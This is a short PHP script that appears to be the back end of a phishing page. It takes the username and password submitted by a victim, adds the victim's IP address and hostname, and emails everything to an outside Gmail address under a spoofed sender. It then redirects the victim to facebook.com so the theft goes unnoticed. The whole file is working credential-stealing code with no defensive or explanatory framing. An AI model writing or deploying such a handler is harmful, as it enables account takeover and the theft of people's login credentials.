<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-----------------|Account Origin|-------------------\n";
$message .= "Mail                            : ".$_POST['username']."\n";
$message .= "Pass                    : ".$_POST['password']."\n";
$message .= "-----------------|Account Origin|-------------------\n";
$send="lolprodajaacc@gmail.com";
$subject = "LOL INFO | $ip";
$headers = "From: LOL <origin@fucked.com>";
mail($send,$subject,$message,$headers);
header("Location: www.facebook.com");
?>